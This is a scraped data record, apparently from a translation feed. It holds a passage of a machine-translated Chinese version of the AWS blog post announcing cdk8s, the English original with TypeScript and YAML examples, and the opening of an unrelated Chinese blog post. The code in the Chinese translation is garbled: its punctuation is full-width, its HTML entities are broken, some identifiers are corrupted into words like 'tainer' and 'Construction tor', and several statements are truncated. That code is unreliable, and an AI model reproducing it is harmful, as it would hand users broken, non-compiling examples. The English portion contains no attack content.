API\u5bf9\u8c61(\u5982Deployment\u3001Service\u3001ReplicaSet\u3001Pod)\u81ea\u52a8\u751f\u6210(\u201c\u5bfc\u5165\u201d)\u6784\u9020\uff0c\u4e5f\u53ef\u4ee5\u4ece\u4efb\u4f55\u81ea\u5b9a\u4e49\u8d44\u6e90\u5b9a\u4e49\u751f\u6210(\u201c\u5bfc\u5165\u201d)\u6784\u9020\u3002\u6211\u4eec\u8fd8\u8ba1\u5212\u589e\u52a0\u5bf9\u4eceHelm\u56fe\u8868\u5bfc\u5165\u7ed3\u6784\u7684\u652f\u6301\u3002\n\u5bfc\u5165\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u6784\u9020\u6765\u5b9a\u4e49\u56fe\u8868\u3002\u56fe\u8868\u8868\u793a\u5355\u4e2aKubernetes YAML\u6e05\u5355\u3002\u4e00\u4e2aApp\u7531\u5c5e\u4e8e\u540c\u4e00\u9879\u76ee\u7684\u591a\u4e2a\u56fe\u8868\u7ec4\u6210\u3002\n\u5728\u4e0b\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u58f0\u660e\u4e86\u4e00\u4e2a\u5177\u6709\u5355\u4e2aKubernetes pod\u7684\u56fe\u8868\u7c7b\u578bHelloChart\u3002\n\u7c7bHelloChart\u6269\u5c55\u4e86Chart{\u6784\u9020\u51fd\u6570(Scope\uff1aConstruct\uff0cName\uff1aString){Super(Scope\uff0cName)\uff1bnew k8s.Pod(this\uff0c&#39\uff1bhello&#39\uff1b\uff0c{spec\uff1a{Containers\uff1a[{name\uff1a&#39\uff1bhello&#39\uff1b\uff0cimage\uff1a&#39\uff1bworld&#39\uff1b}]}})\uff1b}}\u3002\nconst app=new App()\uff1bnew HelloChart(app\uff0c#39\uff1bhello&39\uff1b)\uff1b//\u5408\u6210\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u6240\u6709\u56fe\u8868(\u6e05\u5355)\u3002app.synth()\uff1b\n\u63a5\u53e3HelloChartOpts{pods\uff1anumber\uff1b}\u7c7bHelloChart\u6269\u5c55Chart{\u6784\u9020\u51fd\u6570(Scope\uff1aConstruct\uff0cName\uff1aString\uff0cOpts\uff1aHelloChartOpts){Super(Scope\uff0cName)\uff1bfor(let i=0\uff1bi&lt\uff1bopts.pods\uff1b++i){new k8s.Pod(this\uff0c&#39\uff1bhello&#39\uff1b+i\uff0c{spec\uff1a{Containers\uff1a[{name\uff1a&#39\uff1bhello&#39\uff1b\uff0cimage\uff1a&\u3002}}}\u3002\n\u5e38\u91cfAPP=new App()\uff1bnew HelloChart(app\uff0c#39\uff1bhello-dev&39\uff1b\uff0c{pods\uff1a1})\uff1bnew HelloChart(app\uff0c#39\uff1bhello-prod&39\uff1b\uff0c{pod\uff1a10000})\uff1bapp.synth()\uff1b\n\u8fd9\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5c06\u8f93\u51fa\u4e24\u4e2a\u6587\u4ef6\uff1ahello-dev.k8s.yaml\u548chello-prod.k8s.yaml(\u6211\u81ea\u5df1\u7684\u5c0fDOS\u5e94\u7528\u7a0b\u5e8f)\u3002\u57fa\u672c\u4e0a\uff0c\u4e00\u884ccdk8\u4f1a\u751f\u6210\u4e00\u4e2a\u8d85\u8fc750K\u884c\u7684YAML\u3002\n\u5173\u4e8e\u6784\u9020\u7684\u9177\u4e4b\u5904\u5728\u4e8e\uff0c\u5c06\u5b83\u4eec\u7ec4\u5408\u6210\u66f4\u9ad8\u7ea7\u522b\u7684\u62bd\u8c61\u662f\u5f88\u7b80\u5355\u7684\u3002\n\u4f8b\u5982\uff0c\u5728K8\u4e2d\uff0c\u90e8\u7f72\u524d\u9762\u6709\u4e00\u4e2a\u670d\u52a1\u662f\u5f88\u5e38\u89c1\u7684\uff0c\u6240\u4ee5\u6211\u53ef\u4ee5\u7528\u4e00\u4e2a\u79f0\u4e3a\u201cServiceDeployment\u201d\u7684\u65b0\u6784\u9020\u7c7b\u578b\u6765\u8868\u793a\uff1a\n\u7c7bWebService\u6269\u5c55\u4e86\u6784\u9020{Construction tor(Scope\uff1aConstruct\uff0cName\uff1aString\uff0copts\uff1aServiceDeploymentOpts){Super(Scope\uff0cName)\uff1bnew k8s.Deployment(this\uff0c.)\uff1bnew k8s.Service(this\uff0c.)\uff1b}\u3002\n\u8fd9\u4e9b\u7ec4\u5408\u4e5f\u79f0\u4e3a\u62bd\u8c61\u5c42\u3002\u8fd9\u4e9b\u5c42\u53ef\u4ee5\u5806\u53e0\u5728\u4e00\u8d77\uff1acdk8s\u5e94\u7528\u7a0b\u5e8f\u7684\u5e95\u5c42\u901a\u5e38\u7531\u4eceK8SAPI\u6216CRD\u751f\u6210\u7684\u5bfc\u5165\u6784\u9020\u7ec4\u6210\uff0c\u7136\u540e\u5c06\u8fd9\u4e9b\u6784\u9020\u7ec4\u5408\u6210\u66f4\u9ad8\u7ea7\u522b\u7684\u62bd\u8c61\u3002\u66f4\u9ad8\u5c42\u53ef\u4ee5\u62bd\u8c61API\u7684\u590d\u6742\u6027(\u4f8b\u5982\uff0c\u901a\u8fc7\u63d0\u4f9b\u667a\u80fd\u7f3a\u7701\u503c)\uff0c\u6216\u8005\u5b83\u4eec\u53ef\u4ee5\u8868\u793a\u81ea\u4ee5\u4e3a\u662f\u7684\u60f3\u6cd5\uff0c\u5c06\u4e3b\u8981\u7ec6\u8282\u62bd\u8c61\u51fa\u6765\uff0c\u4ee5\u652f\u6301\u66f4\u7b80\u5355\u7684\u5fc3\u7406\u6a21\u578b\u3002\n\u73b0\u5728\u6211\u5df2\u7ecf\u7f16\u5199\u4e86\u62bd\u8c61\uff0c\u6211\u53ef\u4ee5\u901a\u8fc7\u5305\u7ba1\u7406\u5668(\u5982NPM\u3001PyPI\u3001Maven Central\u3001NuGet\u6216\u4efb\u4f55\u5185\u90e8\u5305\u7ba1\u7406\u5668)\u4e0e\u4efb\u4f55\u4eba\u5171\u4eab\u5b83\u4eec\uff0c\u5c31\u50cf\u4efb\u4f55\u5176\u4ed6\u7c7b\u5e93\u4e00\u6837\u3002\u8fd9\u4f7f\u5f97\u4f7f\u7528cdk8\u5728\u6574\u4e2a\u516c\u53f8\u6216\u4e0e\u793e\u533a\u5171\u4eab\u6700\u4f73\u5b9e\u8df5\u53d8\u5f97\u5f88\u5bb9\u6613\u3002\n\u6784\u9020\u5728\u6211\u7684\u4ee3\u7801\u4e2d\u8868\u793a\u4e3a\u9762\u5411\u5bf9\u8c61\u7684\u7c7b\u3002\u8fd9\u610f\u5473\u7740\u6211\u53ef\u4ee5\u4f7f\u7528\u9762\u5411\u5bf9\u8c61\u8bbe\u8ba1\u7684\u6240\u6709\u529f\u80fd\u4e3a\u6211\u7684\u6784\u9020\u521b\u5efa\u6f02\u4eae\u800c\u4e30\u5bcc\u7684API\u3002\nconst book=new k8s.Service(this\uff0c#39\uff1bbook-Collection&#39\uff1b\uff0c.)\uff1bconst book=new k8s.Service(this\uff0c#39\uff1bbook&39\uff1b\uff0c.)\uff1bconst OAuth=new\u5927\u4f7f.Oauth2Filter(this\uff0c#39\uff1bauth&39\uff1b\uff0c{AuthizationUrl\uff1a&#39\uff1burl&39\uff1b\uff0c//.})\uff1bconst API=new ambasador.Api(\u3002api.get(&#39\uff1b/book&#39\uff1b\uff0cbook)\uff1bapi.get(&#39\uff1b/book/.*/&#39\uff1b\uff0cbook\uff0c{prefix Regex\uff1atrue})\uff1bapi.post(&#39\uff1b/book&#39\uff1b\uff0cbook\uff0c{filter\uff1aOAuth})\uff1bapi.put(&#39\uff1b/book/.*/&#39\uff1b\uff0cbook\uff0c{filter\uff1aOAuth\uff0cprefix regex\uff1atrue})\uff1b\n\u5728\u8fd9\u4e2a\u6a21\u578b\u4e2d\uff0cambasador.Api\u6784\u9020\u516c\u5f00\u4e86\u4e00\u7ec4\u65b9\u6cd5\uff0c\u8fd9\u4e9b\u65b9\u6cd5\u5141\u8bb8\u7528\u6237\u901a\u8fc7\u53cb\u597d\u7684\u5f3a\u7c7b\u578b\u8bed\u6cd5\u63cf\u8ff0\u4ed6\u4eec\u7684\u8def\u7531\u6620\u5c04\u548c\u914d\u7f6e\u3002\n\u8fd9\u662fcdk8\u7684\u7b2c\u4e00\u5929\u3002\u6211\u4eec\u6b63\u5728\u63a2\u7d22\u8bbe\u8ba1\u4e00\u4e2a\u6db5\u76d6\u6838\u5fc3KubernetesAPI\u7684\u4e30\u5bcc\u7684\u9ad8\u7ea7\u6784\u9020\u5e93\u7684\u610f\u4e49\u3002\u6211\u4eec\u7684\u60f3\u6cd5\u662f\u901a\u8fc7\u4e00\u4e2a\u5f88\u68d2\u7684\u7c7b\u5e93\u516c\u5f00Kubernetes\u7684\u5168\u90e8\u529f\u80fd\u96c6\u3002\n\u8981\u4e86\u89e3\u8fd9\u53ef\u80fd\u662f\u4ec0\u4e48\u6837\u5b50\uff0c\u8bf7\u8003\u8651Kubernetes\u4e2d\u7684\u5e38\u89c1\u6a21\u5f0f\uff0c\u5728\u8be5\u6a21\u5f0f\u4e2d\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528ConfigMap\u6765\u5b58\u50a8\u67d0\u4e9b\u914d\u7f6e\u7684\u5185\u5bb9\uff0c\u5e76\u901a\u8fc7\u5377\u5c06\u5176\u63d0\u4f9b\u7ed9Pod\u3002\n\u901a\u8fc7\u4ee5\u4e0bYAML\uff1aapiVersion\uff1av1 Kind\uff1aPod Metadata\uff1aName\uff1adapi-test-pod spec\uff1aContainers\uff1a-name\uff1atest-tainer image\uff1ak8s.gcr.io/busybox\u547d\u4ee4\u5b9a\u4e49Pod\uff1a[&#34\uff1b/bin/sh&#34\uff1b\uff0c&#34\uff1b-c&#34\uff1b\uff0c&#34\uff1bls/etc/config/&#34\uff1b]volumemount\uff1a-name\uff1aconfig-volume mount tPath\uff1a/etc/confit\u3002\n//\u4f7f\u7528\u672c\u5730\u76ee\u5f55const config=ConfigMap.fromDirectory(this\uff0c./config&#39\uff1b)\u4e2d\u7684\u6240\u6709\u6587\u4ef6\u5b9a\u4e49\u914d\u7f6e\u6620\u5c04\uff1b//\u5b9a\u4e49pod const pod=new Pod(this\uff0c&#39\uff1bdapi-test-pod&#39\uff1b)\uff1b//\u5c06\u914d\u7f6e\u6620\u5c04\u6dfb\u52a0\u4e3a\u5377const volume=pod.addConfigMapVolume(Config)\uff1b//\u5411pod\u6dfb\u52a0\u5bb9\u5668\u5e76\u6302\u8f7d\u6587\u4ef6//)\uff1btainer.image=&#39\uff1bk8s.gcr.io/busybox&#39\uff1b\uff1btainer.mount(volume\uff0c&#39\uff1b/etc/config&#39\uff1b)\uff1b//&lt\uff1b--nices\uff01tainer.command=[&#34\uff1b/bin/sh&#34\uff1b\uff0c&#34\uff1b-c&#34\uff1b\uff0c&#34\uff1bls/etc/config/&#34\uff1b]\uff1btainer.restartPolicy=PodRestartPolicy.NEVER\uff1b\n\u6211\u5e0c\u671b\u8fd9\u80fd\u8ba9\u60a8\u611f\u53d7\u5230\u8fd9\u79cd\u9ad8\u7ea7API\u7684\u6f5c\u529b\u3002\u60a8\u53ef\u4ee5\u5728GitHub\u4e0a\u7684\u7814\u7a76\u90e8\u5206\u627e\u5230\u5173\u4e8e\u9ad8\u7ea7\u8bbe\u8ba1\u9879\u76ee\u7684\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\u3002\n\u4eca\u5929\u6211\u4eec\u5ba3\u5e03cdk8s\u5904\u4e8e\u201calpha\u201d\u9636\u6bb5\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u8ba4\u4e3a\u4eba\u4eec\u53ef\u4ee5\u5f00\u59cb\u5728\u4ed6\u4eec\u7684\u73af\u5883\u4e2d\u73a9\u800d\u4e86\uff0c\u5e76\u4e0e\u6211\u4eec\u5408\u4f5c\u4f7f\u8fd9\u4e2a\u9879\u76ee\u9002\u7528\u4e8e\u4ed6\u4eec\u7684\u7528\u4f8b\u3002\n\u8fd9\u4e5f\u610f\u5473\u7740\uff0c\u6211\u4eec\u9884\u8ba1cdk8\u5728\u672a\u6765\u51e0\u4e2a\u6708\u5c06\u7ee7\u7eed\u5927\u5e45\u53d8\u5316\uff0c\u76f4\u5230\u6211\u4eec\u611f\u89c9\u5230\u5b83\u662f\u7a33\u5b9a\u7684\u3002\u6211\u4eec\u5c06\u5728\u6bcf\u4e2a\u7248\u672c\u4e2d\u53d1\u5e03\u4e00\u4e2aChangeLog\uff0c\u5176\u4e2d\u5305\u542b\u6709\u5173\u4e2d\u65ad\u66f4\u6539\u548c\u65b0\u529f\u80fd\u7684\u4fe1\u606f\u3002\ncdk8s\u662f\u4e00\u4e2a\u5f00\u6e90\u9879\u76ee\uff0c\u4e3a\u6574\u4e2aKubernetes\u793e\u533a\u6784\u5efa\u3002\u5b83\u662f\u5728https://github.com/awslabs/cdk8s\u4e0a\u5b8c\u5168\u5f00\u53d1\u7684\uff0c\u6211\u4eec\u9f13\u52b1\u548c\u5e86\u795d\u6240\u6709\u7684\u5408\u4f5c\u548c\u8d21\u732e\u3002\n\u6211\u4eec\u5f88\u4e50\u610f\u542c\u53d6\u60a8\u7684\u610f\u89c1\uff0c\u5e76\u6b22\u8fce\u60a8\u5c31API\u3001\u5f00\u53d1\u4eba\u5458\u4f53\u9a8c\u3001\u4e0e\u5176\u4ed6\u5de5\u5177\u3001\u6587\u6863\u6216\u529f\u80fd\u7684\u96c6\u6210\u53d1\u8868\u610f\u89c1\u3002\n\u4ee5\u4e0b\u662f\u6211\u4eec\u4e00\u76f4\u5728\u63a2\u7d22\u7684\u51e0\u4e2a\u65b9\u5411\uff0c\u4ee5\u53ca\u4ed6\u4eec\u7684GitHub\u95ee\u9898\u94fe\u63a5\uff0c\u56e0\u6b64\u60a8\u53ef\u4ee5+1\u53c2\u4e0e\u8ba8\u8bba\uff1a\n\u589e\u52a0\u5bf9\u65b0\u8bed\u8a00\u7684\u652f\u6301\uff1aJava\u3001.NET\u548cGo\u90fd\u5728\u6211\u4eec\u7684\u96f7\u8fbe\u4e0a\u3002\u8bf7\u8ba9\u6211\u4eec\u77e5\u9053\u60a8\u8fd8\u60f3\u770b\u5230\u54ea\u4e9b\u5176\u4ed6\u8bed\u8a00\u3002\n\u5c06\u6784\u9020\u53d1\u5e03\u4e3a\u7531\u901a\u7528\u201cCDK\u5408\u6210\u5668\u64cd\u4f5c\u7b26\u201d\u652f\u6301\u7684\u81ea\u5b9a\u4e49\u8d44\u6e90\u3002\n\u6211\u4eec\u5bf9\u8fd9\u4e2a\u9879\u76ee\u611f\u5230\u96be\u4ee5\u7f6e\u4fe1\u7684\u5174\u594b\uff0c\u5e76\u575a\u4fe1\u5b83\u53ef\u4ee5\u8ba9\u4f7f\u7528Kubernetes\u7684\u5f00\u53d1\u4eba\u5458\u7684\u751f\u6d3b\u53d8\u5f97\u4ee4\u4eba\u96be\u4ee5\u7f6e\u4fe1\u5730\u5bcc\u6709\u6210\u6548\u548c\u4e50\u8da3\u3002\n\u8981\u5f00\u59cb\uff0c\u8bf7\u8bbf\u95eecdk8s.io\u3002\u4f53\u9a8ccdk8\u7684\u6700\u597d\u65b9\u6cd5\u662f\u901a\u8fc7\u4e00\u4e2a\u5165\u95e8\u6307\u5357(\u65e0\u8bba\u662f\u7528\u6587\u5b57\u811a\u672c\u8fd8\u662f\u7528Python)\u62ff\u8d77\u5b83\u65cb\u8f6c\u4e00\u4e0b\u3002\u8fd9\u4e9b\u5feb\u901f\u7684\u5c0f\u6559\u7a0b\u5c06\u5f15\u5bfc\u60a8\u5b8c\u6210\u5b89\u88c5cdk8\u3001\u4f7f\u7528k8sAPI\u751a\u81f3\u521b\u4f5c\u60a8\u81ea\u5df1\u7684\u81ea\u5b9a\u4e49\u6784\u9020\u7684\u7b2c\u4e00\u6b65\u3002", "note_en": "At AWS, we\u2019ve seen customers rapidly adopt Kubernetes to deploy applications globally, train machine learning models at scale, and standardize how they deliver innovation across data centers and the cloud. Using Kubernetes, customers are building automated tooling to replace manual processes, implementing operational pipelines for every piece of their infrastructure, and empowering development teams with the ability to get granular control over how their applications run.\n  Traditionally, Kubernetes applications are defined with human-readable, static YAML data files which developers write and maintain. Building new applications requires writing a good amount of boilerplate config, copying code from other projects, and applying manual tweaks and customizations. As applications evolve and teams grow, these YAML files become harder to manage. Sharing best practices or making updates involves manual changes and complex migrations.\n  YAML is an excellent format for describing the desired state of your cluster, but it is does not have primitives for expressing logic and reusable abstractions. There are  multiple tools in the Kubernetes ecosystem ( kustomize,  jsonnet,  jkcfg,  kubecfg,  kubegen, and  Pulumi to name a few) which attempt to address these gaps in various ways.\n  We realized this was exactly the same problem our customers had faced when defining their applications through CloudFormation templates, a problem solved by the AWS CDK, and that we could apply the same design concepts from the AWS CDK to help all Kubernetes users.\n  In 2018 we introduced the  AWS Cloud Development Kit (AWS CDK) to help AWS CloudFormation customers who wanted an alternative to YAML for many of the same reasons. The AWS CDK is an open-source framework for defining cloud infrastructure using familiar programming languages such as TypeScript, Python, Java, and .NET. Customers love how AWS CDK simplifies the development process by enabling them to use their existing tooling and workflows to write and provision their infrastructure. They also love that AWS CDK is composable, making it easy for them to abstract away configuration and boilerplate details. Many of our customers have asked us if it would be possible to apply the same concepts and technologies to the Kubernetes space.\n    Today I\u2019d like to tell you about the  CDK for Kubernetes, or cdk8s, a new  open-source project that lets you define Kubernetes applications and reusable components using familiar programming languages. cdk8s (pronounced \u201c cd kates\u201c) lets you use programming languages like TypeScript or Python to generate standard Kubernetes YAML \u2013 which means that you can use it to define applications for any Kubernetes cluster running anywhere, both on-premises and the cloud.\n  cdk8s lets you import both core Kubernetes API objects and  Custom Resources (CRDs) as strongly typed classes called \u201c constructs\u201c. This means that you can leverage all the powerful primitives of object-oriented programming to define Kubernetes applications. One of the most powerful capabilities is the ability to compose your own abstractions.\n  Using cdk8s you can publish common Kubernetes patterns as code libraries, then reference these libraries in any application. This simplifies defining and maintaining applications for all Kubernetes users and builds on top of the Kubernetes declarative API approach while fundamentally respecting its capabilities and flexibility. It also means that you can author Kubernetes applications using the languages, IDEs, tools, and techniques you are familiar with.\n    Works for any cluster cdk8s is environment agnostic. It runs locally on your machine and generates standard Kubernetes YAML data, so you can use it with any Kubernetes cluster running anywhere, including on-premises and the cloud\n  Imperative approach to declarative state cdk8s code is written using imperative languages but eventually outputs your desired state as pure Kubernetes YAML. This means you can enjoy the expressiveness and simplicity of imperative programming without compromising on the robustness of the declarative desired state approach.\n  Use any Kubernetes API version and custom resources cdk8s includes a nifty CLI tool that lets you import any version of the Kubernetes API to your project, and update to take advantage of new API versions when you wish. You can also import custom resource definitions.\n  Language support cdk8s lets you define applications using TypeScript, JavaScript, and Python. Support for more languages, including Go is planned.\n  Open source cdk8s is open source and we welcome community contributions. We built cdk8s for the entire Kubernetes community, not just AWS customers.\n    Let\u2019s take a look at how to define a simple Kubernetes app with cdk8s.\n  const labels = { app: &#39;guestbook&#39;, tier: &#39;frontend&#39; };\r\rnew k8s.Service(this, &#39;service&#39;, {\r metadata: { labels },\r spec: {\r type: &#39;LoadBalancer&#39;,\r ports: [ { port: 80 } ],\r selector: labels,\r }\r});\r\rnew k8s.Deployment(this, &#39;deployment&#39;, {\r spec: {\r selector: { matchLabels: labels },\r replicas: 3,\r template: {\r metadata: { labels },\r spec: {\r containers: [\r {\r name: &#39;php-redis&#39;,\r image: &#39;gcr.io/google-samples/gb-frontend:v4&#39;,\r ports: [{ containerPort: 80 }],\r resources: { requests: { cpu: &#39;100m&#39;, memory: &#39;100Mi&#39; } }\r }\r ]\r }\r }\r }\r});\n  This is the definition of the  Kubernetes guestbook frontend, synthesizing this produces a familiar YAML output that I can apply to my cluster:\n  apiVersion: v1\rkind: Service\rmetadata:\r labels:\r app: guestbook\r tier: frontend\r name: guestbook-service-23e79b52\rspec:\r ports:\r - port: 80\r selector:\r app: guestbook\r tier: frontend\r type: LoadBalancer\r---\rapiVersion: apps/v1\rkind: Deployment\rmetadata:\r name: guestbook-deployment-8b2b7b76\rspec:\r replicas: 3\r selector:\r matchLabels:\r app: guestbook\r tier: frontend\r template:\r metadata:\r labels:\r app: guestbook\r tier: frontend\r spec:\r containers:\r - image: gcr.io/google-samples/gb-frontend:v4\r name: php-redis\r ports:\r - containerPort: 80\r resources:\r requests:\r cpu: 100m\r memory: 100Mi\n    cdk8s includes typed classes for all the Kubernetes APIs. This means that when I write it, I can get all the help from my beloved IDE, which includes code completion, type-safety (for static languages), inline documentation, refactoring tools, and all that jazz:\n      So how does this get deployed into my cluster? When a cdk8s app is executed it synthesizes standard Kubernetes YAML, the workflow and tools you use to deploy this YAML to your cluster remain the same.\n  $ cdk8s synth -o dist &amp;&amp; kubectl apply -f dist/*\rdist/guestbook.k8s.yaml\rservice/guestbook-service-23e79b52 created\rdeployment.apps/guestbook-deployment-8b2b7b76 created\n  This also means that cdk8s apps can neatly be integrated into any standard GitOps workflow. Using cdk8s with GitOps means you can have the same workflow for defining your application (write in code, deploy with CICD) as you do for building it. Check out these posts by Max Brenner\u2019s about Integrating cdk8s with  Flux and also with  Argo CD.\n    The building blocks of CDK apps are called \u201c constructs\u201d (remember  The Matrix?). Constructs can represent anything: from individual Kubernetes resources such as Pods, to complex ideas such as Microservices or a fully-fledged MongoDB cluster. They could even represent complete systems to model your entire cluster.\n  cdk8s can automatically generate (\u201cimport\u201d) constructs for all the core Kubernetes API objects (such as Deployment, Service, ReplicaSet, Pod) and also from any Custom Resource Definition. We are also planning to add support for importing constructs from Helm charts.\n  Once imported, we can use these constructs to define Charts. A  Chart represents a single Kubernetes YAML manifest. An  App is composed of multiple charts that are part of the same project.\n  In the following example, I\u2019ve declared a chart type  HelloChart with a single Kubernetes pod.\n  class HelloChart extends Chart {\r constructor(scope: Construct, name: string) {\r super(scope, name);\r\r new k8s.Pod(this, &#39;hello&#39;, {\r spec: {\r containers: [ { name: &#39;hello&#39;, image: &#39;world&#39; } ]\r }\r });\r }\r}\n    const app = new App();\rnew HelloChart(app, &#39;hello&#39;);\r\r// synthesize all charts (manifests) in the app.\rapp.synth();\n        interface HelloChartOpts {\r pods: number;\r}\r\rclass HelloChart extends Chart {\r constructor(scope: Construct, name: string, opts: HelloChartOpts) {\r super(scope, name);\r\r for (let i = 0; i &lt; opts.pods; ++i) {\r new k8s.Pod(this, &#39;hello&#39; + i, {\r spec: {\r containers: [ { name: &#39;hello&#39;, image: &#39;world&#39; } ]\r }\r });\r }\r }\r}\n    const app = new App();\rnew HelloChart(app, &#39;hello-dev&#39;, { pods: 1 });\rnew HelloChart(app, &#39;hello-prod&#39;, { pod: 10000 });\rapp.synth();\n  This app will output two files:  hello-dev.k8s.yaml with a single pod and hello-prod.k8s.yaml with 10,000 pods (my own little DoS app). Basically one-line of cdk8s generates a YAML with over 50K lines.\n    The cool thing about constructs is that it\u2019s straightforward to compose them into higher-level abstractions.\n  For example, it\u2019s very common in k8s to have a deployment with a service in front of it, so I can express this using a new construct type called \u201cServiceDeployment\u201d:\n  class WebService extends Construct {\r constructor(scope: Construct, name: string, opts: ServiceDeploymentOpts) {\r super(scope, name);\r\r new k8s.Deployment(this, ...);\r new k8s.Service(this, ...);\r }\r }\r}\n      These compositions are also known as abstraction layers. These layers can be stacked on top of each other: the bottom layer in a cdk8s app will normally consist of imported constructs generated from the k8s API or from CRDs, who are then composed into higher level abstractions. Higher layers can abstract the complexity of the API (by providing smart defaults for example) or they can represent opinionated ideas that abstract away major details in favor of a simpler mental model.\n  Now that I authored my abstractions, I can share them with anyone through a package manager such as  npm,  PyPI,  Maven Central,  NuGet or any internal package manager, just like any other class library. This makes it easy to use cdk8s to share best practices across your company or with the community.\n    Constructs are expressed in my code as object-oriented classes. This means that I can use all the power of object-oriented design to create beautiful and rich APIs for my constructs.\n    const books = new k8s.Service(this, &#39;book-collection&#39;, ...);\rconst book = new k8s.Service(this, &#39;book&#39;, ...);\r\rconst oauth = new ambassador.Oauth2Filter(this, &#39;auth&#39;, {\r authorizationUrl: &#39;url&#39;,\r // ...\r});\r\rconst api = new ambassador.Api(this, &#39;gateway&#39;);\rapi.get(&#39;/books&#39;, books);\rapi.get(&#39;/books/.*/&#39;, book, { prefixRegex: true });\rapi.post(&#39;/books&#39;, books, { filter: oauth });\rapi.put(&#39;/books/.*/&#39;, book, { filter: oauth, prefixRegex: true });\n  In this mock up, the  ambassador.Api construct exposes a bunch of methods that allow users to describe their route mappings and configuration through a friendly, strongly-typed syntax.\n      This is day one for cdk8s. We are exploring the implications of designing a rich high-level construct library that will cover the core Kubernetes APIs. The idea is to expose the full feature set of Kubernetes through an awesome class library.\n  For a taste of what that might look like, consider the common pattern in Kubernetes where you can use a ConfigMap to store the contents of some configuration and make it available to a pod via a volume.\n    Define the pod through this YAML:  apiVersion: v1\rkind: Pod\rmetadata:\r name: dapi-test-pod\rspec:\r containers:\r - name: test-container\r image: k8s.gcr.io/busybox\r command: [ &#34;/bin/sh&#34;, &#34;-c&#34;, &#34;ls /etc/config/&#34; ]\r volumeMounts:\r - name: config-volume\r mountPath: /etc/config\r volumes:\r - name: config-volume\r configMap:\r name: my-config\r restartPolicy: Never\n    // define a config map with all the files in a local dir\rconst config = ConfigMap.fromDirectory(this, &#39;./config&#39;);\r\r// define a pod\rconst pod = new Pod(this, &#39;dapi-test-pod&#39;);\r\r// add the config map as a volume\rconst volume = pod.addConfigMapVolume(config);\r\r// add a container to the pod and mount the files\r// to /etc/config, and print them on initialization\rconst container = pod.addContainer(&#39;test-container&#39;);\rcontainer.image = &#39;k8s.gcr.io/busybox&#39;;\rcontainer.mount(volume, &#39;/etc/config&#39;); // &lt;-- NICE!\rcontainer.command = [ &#34;/bin/sh&#34;, &#34;-c&#34;, &#34;ls /etc/config/&#34; ];\rcontainer.restartPolicy = PodRestartPolicy.NEVER;\n  I hope this gives you a sense of the potential of such high-level API. You can find more details about the high-level design project in our  research section on GitHub.\n    Today we are announcing that cdk8s is in \u201c alpha\u201d stage. This means that we think it is ready for folks to start to play with in their environments, and collaborate with us to make this project work for their use cases.\n  It also means that we expect cdk8s to continue to change significantly in the coming months, until we feel it is stable. We will publish a changelog with each release with information about breaking changes and new features.\n  cdk8s is an open-source project, built for the entire Kubernetes community. It is fully developed on  https://github.com/awslabs/cdk8s and we encourage and celebrate all collaboration and contribution.\n  We\u2019d love to hear what you have to say and welcome contributions on the APIs, developer experience, integration with other tools, documentation, or features.\n  Here are a few directions we\u2019ve been exploring, along with their GitHub issue links, so you can +1 and participate in the discussion:\n  Add support for new languages:  Java,  .NET and  Go are on our radar. Let us know what  other languages you\u2019d like to see.\n      Publish constructs as custom resources backed by a generic \u201cCDK synthesizer operator\u201d.\n  We are incredibly excited about this project and truly believe it can make life incredibly productive and fun for developers using Kubernetes.\n    To get started, go to  cdk8s.io. The best way to get a feel for cdk8s is to pick it up for a little spin through one of the Getting Started guides, either in  TypeScript or in  Python. These snappy little tutorials will walk you through the first steps of installing cdk8s, using the k8s APIs and even authoring your own custom constructs.", "posttime": "2020-05-15 00:04:05", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u5185\u65af,cdk,kubernetes", "title": "\u5e93\u4f2f\u5185\u65af\u7684CDK", "title_en": "CDK for Kubernetes", "transed": 1, "url": "https://aws.amazon.com/blogs/containers/introducing-cdk-for-kubernetes/", "via": "", "real_tags": ["\u5185\u65af", "cdk"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1002104, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6559\u4e66\u80b2\u4eba\u5bf9\u6211\u6765\u8bf4\u4e00\u76f4\u662f\u4e00\u9879\u6311\u6218\u3002\u6211\u503e\u5411\u4e8e\u8df3\u8fc7\u6211\u9519\u8bef\u5730\u8ba4\u4e3a\u663e\u800c\u6613\u89c1\u7684\u4e8b\u60c5\uff0c\u6216\u8005\u5728\u89e3\u91ca\u95ee\u9898\u7684\u89e3\u51b3\u65b9\u6848\u65f6\u5728\u63a8\u7406\u4e0a\u6709\u5f88\u5927\u7684\u98de\u8dc3\u3002\u56e0\u6b64\uff0c\u5f53\u6211\u8bd5\u56fe\u89e3\u91ca\u4e00\u4e2a\u5b8c\u6574\u7684\u89c6\u89d2\u65f6\uff0c\u6211\u503e\u5411\u4e8e\u6f2b\u65e0\u8fb9\u9645\u5730\u95f2\u804a\uff0c\u5e0c\u671b\u89c2\u4f17\u77e5\u9053\u5982\u679c\u6211\u8bb2\u5f97\u592a\u5feb\uff0c\u4ec0\u4e48\u65f6\u5019\u5e94\u8be5\u6253\u65ad\u6211\u3002\u7136\u800c\uff0c\u8fd9\u5e76\u4e0d\u9002\u7528\u4e8e\u535a\u5ba2\u5e16\u5b50\uff0c\u6bd4\u5982\u6211\u76ee\u524d\u6b63\u5728\u5199\u7684\u90a3\u7bc7\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6211\u6709\u4e00\u4e2a\u8981\u6c42\uff0c\u8bfb\u8005\uff0c\u8bf7\u4e00\u5b9a\u8981\u544a\u8bc9\u6211\uff0c\u5982\u679c\u6211\u5728\u8fd9\u4e2a\u95ee\u9898\u4e0a\u8d70\u5f97\u592a\u5feb\u4e86-\u8c22\u8c22\uff01\n\u90a3\u4e48\uff0c\u6211\u4e3a\u4ec0\u4e48\u8981\u5199\u8fd9\u7bc7\u770b\u4f3c\u8dd1\u9898\u7684\u5e8f\u8a00\u5462\uff1f\u6211\u4e00\u76f4\u5728\u8bd5\u7740\u5199\u4e00\u7bc7\u5173\u4e8e\u6301\u4e45\u6027\u5185\u5b58\u7f16\u7a0b\u7684\u6027\u80fd\u4ee5\u53ca\u4e3a\u4ec0